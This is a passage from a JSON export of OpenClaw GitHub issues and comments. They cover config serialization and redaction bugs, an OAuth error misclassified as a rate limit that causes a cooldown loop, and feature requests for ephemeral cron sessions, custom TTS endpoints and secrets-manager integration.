      "createdAt": "2026-02-11T06:29:11Z",
      "updatedAt": "2026-02-11T06:29:11Z",
      "author": "nimrodlehavi",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13348,
      "title": "[Bug]: Web UI Form Editor serializes number fields as strings, causing `config.set` validation failure",
      "body": "### Summary\n\nWhen saving configuration changes through the Web UI **Form Editor**, all numeric fields (e.g., `maxTokens`, `contextWindow`, `cost.*`) under `models.providers` are serialized as strings instead of numbers. This causes `config.set` to reject the payload with `\"invalid config\"`, while saving the **exact same configuration** via Raw Config or CLI succeeds.\n\n### Steps to Reproduce\n\n1. Add a custom model provider with numeric fields in `openclaw.json` (via Raw Config or CLI):\n   ```json5\n   {\n     models: {\n       providers: {\n         xai: {\n           baseUrl: \"https://api.x.ai/v1\",\n           api: \"openai-completions\",\n           models: [\n             {\n               id: \"grok-4\",\n               name: \"Grok 4\",\n               contextWindow: 131072,\n               maxTokens: 8192,\n               cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }\n             }\n           ]\n         }\n       }\n     }\n   }\n   ```\n2. Open the Web UI → Settings → Form Editor.\n3. Change **any** setting (does not need to be related to the model provider).\n4. Click **Save**.\n\n**Result:** `Error: invalid config`\n\n### Root Cause\n\nThe Form Editor's `<input>` fields produce string values by default. When the form is serialized for `config.set`, numeric fields like `maxTokens` are sent as `\"8192\"` (string) instead of `8192` (number).\n\nServer-side validation (`validateConfigObjectWithPlugins`) then rejects the payload:\n\n```\npath:    models.providers.xai.models.0.maxTokens\nmessage: Invalid input: expected number, received string\n```\n\n### Evidence\n\nAdded temporary `console.error` logging inside the `config.set` handler to capture `validated.issues`:\n\n```\n[DEBUG config.set] validation issues: [\n  {\n    \"path\": \"models.providers.xai.models.0.maxTokens\",\n    \"message\": \"Invalid input: expected number, received string\"\n  }\n]\n```\n\nMeanwhile, submitting the **identical** config file content via CLI succeeds:\n\n```bash\nopenclaw gateway call config.set --params '{\"raw\": \"<file contents>\", \"baseHash\": \"<hash>\"}'\n# ✓ succeeds — all numeric fields are correctly typed in the JSON file\n```\n\n### Expected Behavior\n\nThe Form Editor should coerce values to their schema-defined types (number, boolean, etc.) before submitting to `config.set`. Alternatively, the `config.set` handler could coerce known numeric fields from strings.\n\n### Workaround\n\nUse **Raw Config** editor instead of Form Editor to save configuration changes.\n\n### Environment\n\n- OpenClaw: 2026.2.9 (gateway) / 2026.2.1 (service unit)\n- OS: Ubuntu 25.04 (VPS)\n- Node: v22.x\n- Browser: safari (macOS)\n",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13348",
      "createdAt": "2026-02-10T11:37:43Z",
      "updatedAt": "2026-02-11T06:25:09Z",
      "author": "alexcz-a11y",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13909,
      "title": "[Bug]: OAuth 403 misclassified as rate_limit → infinite cooldown loop, no CLI recovery",
      "body": "### Environment\n- OpenClaw 2026.2.9 (33c75cb)\n- WSL2 Ubuntu, Node 22.22.0\n- Telegram channel, 1 agent (main)\n- Auth: 2 Anthropic OAuth tokens in auth-profiles.json\n- Default model: anthropic/claude-opus-4-6\n\n### Bug Description\n\nAn Anthropic OAuth token missing the `user:profile` scope returns HTTP 403. OpenClaw misclassifies this as `rate_limit` instead of `auth_error`, putting the entire Anthropic provider into cooldown. Since all fallback models (opus-4-6, opus-4-5, haiku-4-5) share the same provider, **all models become unavailable simultaneously**.\n\nThe heartbeat cron job and incoming Telegram messages continuously retry the failed provider, resetting the cooldown timer each time → **infinite cooldown loop**. The bot becomes completely unresponsive with no CLI path to recovery.\n\n### Expected Behavior\n\n1. HTTP 403 with scope error should be classified as `auth_error`, not `rate_limit`\n2. Clear error message indicating the OAuth scope issue\n3. Cooldown should not block all models when the issue is token-specific\n4. A CLI command should exist to reset provider cooldowns\n\n### Actual Behavior\n\n```\nerror Embedded agent failed before reply: All models failed (3):\n  anthropic/claude-opus-4-6: Provider anthropic is in cooldown (all profiles unavailable) (rate_limit)\n  anthropic/claude-opus-4-5: Provider anthropic is in cooldown (all profiles unavailable) (rate_limit)\n  anthropic/claude-haiku-4-5: Provider anthropic is in cooldown (all profiles unavailable) (rate_limit)\n```\n\n`openclaw status` shows:\n```\nUsage: Claude: HTTP 403: OAuth token does not meet scope requirement user:profile\n```\n\n`openclaw models status` shows:\n```\nanthropic:default=token:sk-ant-o...V1piGgAA [cooldown 5m]\n```\n\n### Recovery Attempts (all failed)\n\n| Command | Result |\n|---|---|\n| `openclaw gateway restart` | Cooldown persisted (loaded from auth-profiles.json) |\n| `openclaw provider refresh anthropic` | Command doesn't exist |\n| `openclaw system refresh --providers` | Command doesn't exist |\n| `openclaw login anthropic` | Command doesn't exist |\n| `openclaw agent restart main` | Requires `-m` flag, then rejects it (\"too many arguments\") |\n| `openclaw config set agents.defaults.model \"...\"` | Validation error: \"expected object, received string\" |\n\n### Actual Fix (manual)\n\n1. Edit `auth-profiles.json`: remove `cooldownUntil`, set `errorCount: 0`, `failureCounts: {}`\n2. Switch model via `openclaw models set anthropic/claude-3-5-sonnet-latest`\n3. `openclaw gateway restart`\n\n### DX Impact: AI assistants can't help users recover\n\nBecause no CLI recovery path exists, users who ask AI assistants (Gemini, ChatGPT, etc.) for help get stuck in a loop of **non-existent commands**. The AI correctly identifies what *should* exist (`provider refresh`, `cooldown reset`, `login`) but these commands don't exist in OpenClaw 2026.2.9.\n\nIn a real-world debugging session, an external AI assistant suggested the following commands — **none of which exist**:\n\n- `openclaw provider refresh anthropic`\n- `openclaw system refresh --providers`\n- `openclaw login anthropic`\n- `openclaw gateway install --force`\n- `openclaw config --path`\n\nThis resulted in ~45 minutes of troubleshooting with zero progress until the user manually edited `auth-profiles.json`. The AI also misdiagnosed the root cause repeatedly (blaming rate limits, security warnings, model tiers, WSL2 networking, and memory plugin status — none of which were the actual problem).\n\n**This highlights that the missing CLI commands aren't just nice-to-haves — they're essential for recoverability.**\n\n### Suggestions\n\n1. **Classify 403 correctly** — Auth/scope errors are not rate limits. A 403 with \"scope requirement\" should surface as `auth_error` with a clear message like: `Token missing required scope 'user:profile'. Re-authenticate with: openclaw auth refresh anthropic`\n\n2. **Add `openclaw provider reset <name>`** — CLI command to clear cooldown state for a provider without editing JSON files manually\n\n3. **Add `openclaw auth refresh <provider>`** — Re-validate or re-authenticate tokens when scope/permission issues arise\n\n4. **Per-profile cooldown, not per-provider** — Don't take down all models when one token/profile is bad. If `anthropic:default` fails, `anthropic:gohan` should still be tried\n\n5. **Circuit breaker for heartbeat/cron** — Stop retrying (and extending cooldown) after N consecutive auth failures. Log a persistent warning instead\n\n6. **`openclaw agent restart` fix** — The `-m` flag handling is broken in 2026.2.9 (requires it, then rejects it)\n\n7. **Cooldown should not persist across gateway restarts** — Or at minimum, `openclaw gateway restart` should have a `--clear-cooldowns` flag\n\n8. **`openclaw doctor`** — A diagnostic command that checks for common issues (expired tokens, cooldown loops, scope errors) and suggests fixes\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13909",
      "createdAt": "2026-02-11T06:16:28Z",
      "updatedAt": "2026-02-11T06:23:52Z",
      "author": "onurcinar92-stack",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 11268,
      "title": "openclaw configure in 2026.2.6-3 writes redacted placeholder values to config file, destroying API keys",
      "body": "## Bug Report\n\n**Version:** 2026.2.6-3 (upgraded from 2026.2.3-1)\n\n**Summary:**\nRunning `openclaw configure` (and likely other config-writing commands) in version 2026.2.6-3 writes the security redaction placeholder `__OPENCLAW_REDACTED__` to the actual `openclaw.json` file instead of preserving the real values. This destroys all API keys, tokens, and even numeric configuration values.\n\n## Steps to Reproduce\n\n1. Update OpenClaw to 2026.2.6-3\n2. Run `openclaw configure`\n3. Check `~/.openclaw/openclaw.json`\n\n## Expected Behavior\n\nConfig file should retain all original API keys, tokens, and configuration values. Security redaction should only apply to:\n- API responses (when querying config via gateway)\n- Logs and output\n- Never to the actual file on disk\n\n## Actual Behavior\n\nAll sensitive values are replaced with `__OPENCLAW_REDACTED__` in the actual config file, including:\n- `channels.discord.token`\n- `env.vars.BRAVE_API_KEY`\n- `env.vars.DEEPSEEK_API_KEY`\n- `models.providers.deepseek.apiKey`\n- `gateway.auth.token`\n- `tools.web.search.apiKey`\n- `skills.entries.*.apiKey`\n- **Even numeric values** like `models.providers.*.models[].maxTokens` (should be 8192, etc.)\n\n## Impact\n\n**Critical** - This bug will:\n- Break Discord connectivity (token destroyed)\n- Break all API-based models (DeepSeek, etc.)\n- Break web search functionality\n- Break all skills requiring API keys\n- Corrupt numeric config values\n- Require users to manually restore all credentials from backup\n\n## Workaround\n\n1. Restore `openclaw.json` from backup before running configure\n2. Avoid running `openclaw configure`, `openclaw doctor --fix`, or any command that writes config until fixed\n3. Consider rolling back to 2026.2.3-1\n\n## Additional Context\n\n- Affected command: `openclaw configure` (timestamp: 2026-02-07T16:10:54Z)\n- Wizard metadata in damaged file shows: `\"lastRunCommand\": \"configure\"`, `\"lastRunVersion\": \"2026.2.6-3\"`\n- The redaction mechanism appears to be incorrectly applied during config write operations\n- User confirmed config file was valid before running configure, damaged after",
      "state": "open",
      "comments": 9,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268",
      "createdAt": "2026-02-07T16:46:58Z",
      "updatedAt": "2026-02-11T06:12:18Z",
      "author": "jsquared71",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3864816771,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3864816771",
          "createdAt": "2026-02-07T16:50:31Z",
          "updatedAt": "2026-02-07T16:50:31Z",
          "author": "jsquared71",
          "body": "**Update:** Attempted to reproduce immediately after filing this issue (same system, same version 2026.2.6-3) by running `openclaw configure` again, and the bug did **not** reproduce - config file remained intact with all real values.\n\nThis suggests the bug may be:\n- Specific to the initial post-update flow (first `configure` or `doctor` run after upgrading)\n- Related to some transient state during the update process\n- A race condition or timing issue\n\nThe bug definitely occurred the first time (confirmed with backup file showing damage), but was not reproducible on subsequent attempts."
        },
        {
          "id": 3864850627,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3864850627",
          "createdAt": "2026-02-07T17:04:05Z",
          "updatedAt": "2026-02-07T17:04:05Z",
          "author": "Cinerar",
          "body": "Definitely smth happens with configs, when i change my openclaw docker-image to 2026.2.6-3 my ollama connection breaks, if i change back to 2025.2.3, everything is working again with same config."
        },
        {
          "id": 3864856127,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3864856127",
          "createdAt": "2026-02-07T17:06:09Z",
          "updatedAt": "2026-02-07T17:06:09Z",
          "author": "jsquared71",
          "body": "**IMPORTANT UPDATE - Root Cause Identified:**\n\nThe bug is **not** from the CLI `openclaw configure` command. The actual culprit is the **macOS menu bar panel's Config UI**.\n\n## Actual Trigger\n\n1. User opens the Config tab in the Mac menu bar app\n2. Makes changes (or clicks Save)\n3. The panel reads config via gateway API (which correctly returns redacted values for security)\n4. **But then writes that redacted response back to the file** instead of preserving real values\n\n## Why the CLI didn't reproduce\n\nThe second `openclaw configure` attempt via CLI worked fine because the CLI is not affected by this bug - only the Mac app's config save logic is broken.\n\n## Timeline clarification\n\n- User updated OpenClaw to 2026.2.6-3\n- Installed Mac menu bar panel (build 9039)\n- Used panel's Config UI to check that models were enabled\n- Config file got corrupted at that moment (not from CLI)\n\n## Impact\n\nAnyone using the Mac menu bar panel to edit config will have their API keys and numeric values destroyed on save.\n\n## Fix needed\n\nThe Mac app's config save logic needs to:\n1. Read current config from **disk** (not via API) to preserve real values\n2. Merge user changes\n3. Write back with real values intact\n4. OR: use a dedicated write endpoint that accepts unredacted values"
        },
        {
          "id": 3864900116,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3864900116",
          "createdAt": "2026-02-07T17:25:05Z",
          "updatedAt": "2026-02-07T17:25:05Z",
          "author": "rayseling",
          "body": "same bug，can't launch macOS app"
        },
        {
          "id": 3865052796,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3865052796",
          "createdAt": "2026-02-07T18:32:17Z",
          "updatedAt": "2026-02-07T18:32:17Z",
          "author": "isfinne",
          "body": "same question"
        },
        {
          "id": 3865796431,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3865796431",
          "createdAt": "2026-02-08T00:06:48Z",
          "updatedAt": "2026-02-08T00:06:48Z",
          "author": "lloyd094",
          "body": "Same bug on my end."
        },
        {
          "id": 3867779543,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3867779543",
          "createdAt": "2026-02-08T18:07:39Z",
          "updatedAt": "2026-02-08T18:07:39Z",
          "author": "Foxtr0t1337",
          "body": "I think the web dashboard is also broken?\nThose fields are empty in dashboard, and can't save config on gateway dashboard."
        },
        {
          "id": 3878443125,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3878443125",
          "createdAt": "2026-02-10T15:19:26Z",
          "updatedAt": "2026-02-10T15:20:18Z",
          "author": "echobb8",
          "body": "I just ran into this issue on the latest version of OpenClaw. Totally broke everything. Thankfully I had backups. Totally nuked the values for maxTokens, contextTokens and API keys."
        },
        {
          "id": 3882465687,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11268#issuecomment-3882465687",
          "createdAt": "2026-02-11T06:12:18Z",
          "updatedAt": "2026-02-11T06:12:18Z",
          "author": "youzaiooo",
          "body": "I encountered the same problem, the macOS application of openclaw cannot be used at all, otherwise it will change openclaw.json."
        }
      ]
    },
    {
      "number": 13907,
      "title": "Feature Request: Custom TTS endpoint support (baseUrl for local/self-hosted TTS)",
      "body": "## Summary\n\nAdd support for custom TTS endpoints via a `baseUrl` configuration option, similar to how custom model providers can be configured.\n\n## Use Case\n\nI'm running a local voice stack with:\n- **Piper TTS** (Wyoming protocol) for text-to-speech\n- **faster-whisper** for speech-to-text\n\nBoth run on my own hardware with zero API costs. The services work great and are OpenAI-API-compatible (or can be wrapped to be).\n\nCurrently, OpenClaw's TTS only supports hardcoded providers:\n- OpenAI\n- ElevenLabs  \n- Edge\n\nThere's no way to point TTS to a custom endpoint like `http://localhost:8101/v1/audio/speech`.\n\n## Proposed Solution\n\nAdd a `baseUrl` option to the TTS config, similar to how `models.providers` works:\n\n```json\n{\n  \"messages\": {\n    \"tts\": {\n      \"provider\": \"openai\",\n      \"openai\": {\n        \"baseUrl\": \"http://localhost:8101\",\n        \"model\": \"piper\",\n        \"voice\": \"de_DE-thorsten-high\"\n      }\n    }\n  }\n}\n```\n\nThis would allow:\n- Self-hosted TTS (Piper, Coqui, etc.)\n- Privacy-conscious deployments\n- Cost savings for high-volume voice usage\n- Custom voices and languages\n\n## Current Workaround\n\nManually calling the local TTS endpoint and sending voice messages via the message tool. Works, but not automated.\n\n## Environment\n\n- OpenClaw version: 2026.2.6-3\n- Local TTS: Piper (Wyoming) via Docker\n- Local STT: faster-whisper via Docker",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13907",
      "createdAt": "2026-02-11T06:03:20Z",
      "updatedAt": "2026-02-11T06:04:27Z",
      "author": "DDZ-DO",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882433375,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13907#issuecomment-3882433375",
          "createdAt": "2026-02-11T06:04:27Z",
          "updatedAt": "2026-02-11T06:04:27Z",
          "author": "DDZ-DO",
          "body": "Duplicate of #9709 - closing in favor of the existing request. Added a 👍 there instead."
        }
      ]
    },
    {
      "number": 13892,
      "title": "[Feature]: cron sessionTarget support for specific session keys",
      "body": "## Summary\n\nCurrently, cron's `sessionTarget` only supports `\"main\"` or `\"isolated\"`. When running multiple bot agents that need to communicate asynchronously, there's no way to send a cron job to a specific existing session (e.g., a Discord channel session like `agent:bot-b:discord:channel:123456789`).\n\nThe problem: Using `sessionTarget: \"main\"` sends to the main session, which has different context than channel-specific sessions. This causes context/personality mismatches when agents try to wake each other.\n\n## Proposed solution\n\nAdd support for `sessionTarget` to accept a specific session key:\n\n```json\n{\n  \"sessionTarget\": \"agent:bot-b:discord:channel:123456789\"\n}\n```\n\nOr add a new field like `sessionKey` that overrides `sessionTarget` when specified, routing the job to an existing session rather than main or a fresh isolated session.\n\n## Alternatives considered\n\n- **sessions_send**: Works for specific session keys, but it's synchronous (waits for response), not async.\n- **isolated + delivery**: Creates a new session each time, doesn't use existing channel session context.\n- **Main session with delivery**: Still runs in main session context, not the channel session context.\n\n## Additional context\n\nUse case: Multi-agent setups where Bot A needs to asynchronously notify Bot B within a specific Discord channel session, preserving that session's conversation history and context.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13892",
      "createdAt": "2026-02-11T05:12:16Z",
      "updatedAt": "2026-02-11T06:01:11Z",
      "author": "greyfolk99",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882409075,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13892#issuecomment-3882409075",
          "createdAt": "2026-02-11T06:01:10Z",
          "updatedAt": "2026-02-11T06:01:10Z",
          "author": "greyfolk99",
          "body": "Update: Found related issue #11199 and PR #11644 which addresses bot-to-bot message filtering in multi-agent Discord setups.\n\nIf #11644 lands, sibling bots will be able to communicate via Discord messages directly, making the async cron workaround unnecessary.\n\nWill close this as won't-fix once that PR is merged."
        }
      ]
    },
    {
      "number": 13900,
      "title": "Feature Request: Ephemeral Cron Sessions",
      "body": "# Feature Request: Ephemeral Cron Sessions\n\n**Repository:** github.com/openclaw/openclaw\n**Type:** Feature Request\n**Priority:** Medium-High\n\n---\n\n## Problem\n\nCron sessions accumulate context tokens over time, eventually hitting the 200k token limit. This happens because:\n\n1. Each cron job run adds to the session's conversation history\n2. There's no way to reset or delete the session after a job completes\n3. Recurring jobs (hourly, daily) compound this quickly\n\n**Real-world example:**\n- `email-check` cron running every 30 minutes\n- Each run adds ~500-2000 tokens\n- After 3-4 days, session hits 200k limit\n- Job silently fails or compacts aggressively\n\n**Current workarounds:**\n- Manual session reset via dashboard\n- 6-hour \"hygiene\" cron to monitor and alert (but can't auto-reset)\n- Accept the token accumulation and rely on compaction\n\nNone of these are ideal for production automation.\n\n---\n\n## Proposed Solution\n\nAdd an `ephemeral` or `cleanup` option for cron jobs:\n\n### Option A: Ephemeral mode (preferred)\n\n```yaml\ncron:\n  jobs:\n    email-check:\n      schedule: \"*/30 6-20 * * *\"\n      sessionTarget: isolated\n      ephemeral: true  # ← NEW\n      payload:\n        kind: agentTurn\n        message: \"Check email...\"\n```\n\n**Behavior:**\n- Session is created fresh for each run\n- After job completes (success or failure), session is deleted\n- No history persists between runs\n- Delivery/announce still works before cleanup\n\n### Option B: Cleanup directive\n\n```yaml\ncron:\n  jobs:\n    email-check:\n      cleanup: \"delete\"  # or \"reset\" or \"keep\" (default)\n```\n\n**Options:**\n- `delete` — Remove session entirely after run\n- `reset` — Clear history but keep session metadata\n- `keep` — Current behavior (default for backward compatibility)\n\n---\n\n## Expected Behavior\n\n1. Cron job triggers\n2. Session is created (if ephemeral) or reused (if not)\n3. Agent runs the task\n4. Delivery/announce happens (if configured)\n5. If `ephemeral: true` or `cleanup: delete`:\n   - Session is deleted after successful delivery\n   - Token count resets to 0 for next run\n6. If job fails, session may be preserved for debugging (optional flag)\n\n---\n\n## Use Cases\n\n1. **Periodic checks** (email, calendar, health) — Don't need history between runs\n2. **Scheduled reports** — One-shot generation, no context needed\n3. **Automation triggers** — Fire-and-forget tasks\n4. **Resource management** — Prevent token bloat on long-running deployments\n\n---\n\n## Alternatives Considered\n\n1. **Lower compaction thresholds for cron sessions** — Still accumulates, just slower\n2. **Per-session-type token limits** — More complex, less clean\n3. **Manual cleanup scripts** — Requires user maintenance, error-prone\n4. **Session TTL** — Could work but less explicit than ephemeral flag\n\n---\n\n## Implementation Notes\n\n- Ephemeral should be opt-in (backward compatible)\n- Consider a brief delay before cleanup to ensure delivery completes\n- Maybe preserve session on failure for debugging (configurable)\n- Could tie into existing `sessions_spawn` cleanup behavior for consistency\n\n---\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- Observed on: Local gateway with multiple cron jobs\n- Reproduction: Any recurring cron job over 3-4 days\n\n---\n\n**Would love to see this! Happy to help test once implemented.** 🎩\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13900",
      "createdAt": "2026-02-11T05:44:19Z",
      "updatedAt": "2026-02-11T05:58:56Z",
      "author": "jeremyknows",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882388720,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13900#issuecomment-3882388720",
          "createdAt": "2026-02-11T05:58:56Z",
          "updatedAt": "2026-02-11T05:58:56Z",
          "author": "0xRaini",
          "body": "Strong +1 on this. I've been hitting the same issue with recurring cron jobs accumulating tokens.\n\nThe proposed `cleanup: \"delete\"` option in `sessions_spawn` is a great start, but for cron specifically, I think the cleanest approach is a session-level config:\n\n```json\n{\n  \"sessionTarget\": \"isolated\",\n  \"sessionPolicy\": \"ephemeral\",  // new field\n  \"payload\": { \"kind\": \"agentTurn\", \"message\": \"Check emails\" }\n}\n```\n\nWhere `sessionPolicy: \"ephemeral\"` means:\n1. **Fresh context every run** — no history from previous runs\n2. **Auto-cleanup** — session data pruned after delivery completes\n3. **No compaction needed** — since each run starts clean\n\nThis is different from `deleteAfterRun` (which deletes the job) — ephemeral sessions keep the job but reset the session.\n\n**Implementation-wise,** this could be as simple as calling `session.clear()` at the start of each cron run when `sessionPolicy === 'ephemeral'`.\n\nFor backward compatibility, default to current behavior (persistent sessions). Only opt-in to ephemeral.\n\nWould love to see this — it's the #1 pain point for production cron automation."
        }
      ]
    },
    {
      "number": 13883,
      "title": "Gateway restart drops in-flight turn messages",
      "body": "## Problem\n\nWhen a gateway restart occurs (via `config.patch`, `config.apply`, or manual restart), any in-flight agent turn is killed and its accumulated messages are never delivered to the channel.\n\n## Observed Behavior\n\n1. User sends message, agent turn starts\n2. Agent generates multiple response messages during processing\n3. Config change triggers SIGUSR1 restart (~2 second delay)\n4. Gateway restarts, killing the active turn\n5. **User receives zero messages** — all accumulated responses are lost\n\n## Expected Behavior\n\nMessages generated before the restart should be delivered, OR the turn state should be preserved and resumed after restart.\n\n## Evidence\n\nFrom gateway logs:\n- `04:28:52` — Message queued, turn starts\n- `04:30:59` — Gateway restart (config.patch)\n- No \"delivered reply\" or \"message processed\" entries for that turn\n\nThe turn simply disappeared — no completion, no delivery, no error.\n\n## Suggested Solutions\n\n### Option A: Flush before restart\nBefore sending SIGUSR1, flush any pending message deliveries for active turns.\n\n### Option B: Turn state persistence\nStore turn state (accumulated messages, position) to disk/DB before restart, resume after.\n\n### Option C: Graceful shutdown with timeout\nWait for active turns to complete (with timeout) before restarting.\n\n### Option D: At minimum — warn the user\nIf restart will kill an active turn, warn the agent or user first.\n\n## Impact\n\nThis causes message loss during what appears to be a normal operation (config changes). The user sees nothing — no error, no partial response, just silence after a long wait.\n\n## Reproduction\n\n1. Start a long-running agent turn (e.g., complex task with multiple tool calls)\n2. During the turn, run `config.patch` or trigger any restart\n3. Observe that no messages from that turn are delivered",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13883",
      "createdAt": "2026-02-11T04:42:03Z",
      "updatedAt": "2026-02-11T05:58:44Z",
      "author": "NOVA-Openclaw",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882387088,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13883#issuecomment-3882387088",
          "createdAt": "2026-02-11T05:58:44Z",
          "updatedAt": "2026-02-11T05:58:44Z",
          "author": "0xRaini",
          "body": "This is a real reliability issue — silent message loss erodes user trust.\n\nOf the suggested options, I think **Option C (graceful shutdown with timeout)** is the most practical:\n\n```ts\n// In the SIGUSR1 handler:\nasync function gracefulRestart() {\n  const activeTurns = getActiveTurns();\n  \n  if (activeTurns.length > 0) {\n    log.info(`Waiting for ${activeTurns.length} active turn(s) to complete...`);\n    \n    // Wait up to GRACE_PERIOD for turns to finish\n    const GRACE_PERIOD_MS = 30_000; // 30 seconds\n    await Promise.race([\n      Promise.all(activeTurns.map(t => t.completion)),\n      sleep(GRACE_PERIOD_MS),\n    ]);\n    \n    // Flush any pending deliveries\n    await flushPendingDeliveries();\n  }\n  \n  // Now restart\n  process.exit(0);\n}\n```\n\n**Complementary quick win:** Even without graceful shutdown, we could add a \"flush on shutdown\" hook that delivers any queued messages before exit. This is simpler to implement and covers the most common case.\n\nThe `config.patch` flow already has a `restartDelayMs` option — could this be extended to include a \"wait for active turns\" step?\n\nHappy to submit a PR for either approach!"
        }
      ]
    },
    {
      "number": 10033,
      "title": "Feature: Built-in secrets management integration (Doppler, 1Password, etc.)",
      "body": "## Summary\n\nRequest for native integration with secrets management tools like Doppler, 1Password, HashiCorp Vault, or similar - instead of relying on `.env` files and JSON configs for sensitive credentials.\n\n## Problem\n\nCurrently, API keys and secrets are stored in:\n- `.env` files (plaintext on disk)\n- `openclaw.json` config (plaintext on disk)\n- Environment variables\n\nThis is insecure because:\n- Secrets are visible in plaintext files\n- Easy to accidentally commit to git\n- No audit trail for secret access\n- No automatic rotation\n- Difficult to manage across multiple environments\n\n## Proposed Solution\n\nNative integration with secrets managers:\n\n### Tier 1 (Most Requested)\n- **Doppler** - Popular for CLI/server environments\n- **1Password CLI** - Common for personal/team use\n- **Bitwarden CLI** - Open source alternative\n\n### Tier 2\n- **HashiCorp Vault** - Enterprise standard\n- **AWS Secrets Manager**\n- **macOS Keychain** - Already on every Mac\n\n## Proposed Config\n\n```json5\n{\n  \"secrets\": {\n    \"provider\": \"doppler\",\n    \"doppler\": {\n      \"project\": \"openclaw\",\n      \"config\": \"dev\"\n    },\n    \"mapping\": {\n      \"ANTHROPIC_API_KEY\": \"anthropic.apiKey\",\n      \"ELEVENLABS_API_KEY\": \"messages.tts.elevenlabs.apiKey\",\n      \"TELEGRAM_BOT_TOKEN\": \"channels.telegram.botToken\"\n    }\n  }\n}\n```\n\n## Benefits\n\n1. **Security** - Secrets never stored in plaintext files\n2. **Audit trail** - Know who accessed what and when\n3. **Rotation** - Easy secret rotation without config changes\n4. **Environment management** - Dev/staging/prod secrets separated\n5. **Team sharing** - Secure secret sharing without sending keys in chat\n\n## Current Workaround\n\nUsing Doppler CLI manually:\n```bash\nELEVENLABS_API_KEY=$(doppler secrets get ELEVENLABS_API_KEY --plain) openclaw gateway start\n```\n\nThis works but requires manual setup and doesn't integrate with OpenClaw's config system.\n\n---\n\n*Filed via Wiwi 🦊 on behalf of @realsamrat*",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033",
      "createdAt": "2026-02-06T01:44:18Z",
      "updatedAt": "2026-02-11T05:37:59Z",
      "author": "realsamrat",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3860880646,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033#issuecomment-3860880646",
          "createdAt": "2026-02-06T14:49:35Z",
          "updatedAt": "2026-02-06T14:49:35Z",
          "author": "danielbrodie",
          "body": "Seconded."
        },
        {
          "id": 3864531688,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033#issuecomment-3864531688",
          "createdAt": "2026-02-07T13:46:13Z",
          "updatedAt": "2026-02-07T13:46:13Z",
          "author": "asciansec",
          "body": "+1 on this. Running OpenClaw on a Pi 5 with 1Password service account for runtime secrets (op read in scripts). Works but the auth-profiles.json and openclaw.json still store tokens in plaintext on disk. Would love native op:// references in config — #5760 was closed in triage but the need is real. Even basic support for environment variable interpolation in auth profile storage would help."
        },
        {
          "id": 3865603612,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033#issuecomment-3865603612",
          "createdAt": "2026-02-07T22:05:24Z",
          "updatedAt": "2026-02-07T22:05:24Z",
          "author": "akoscz",
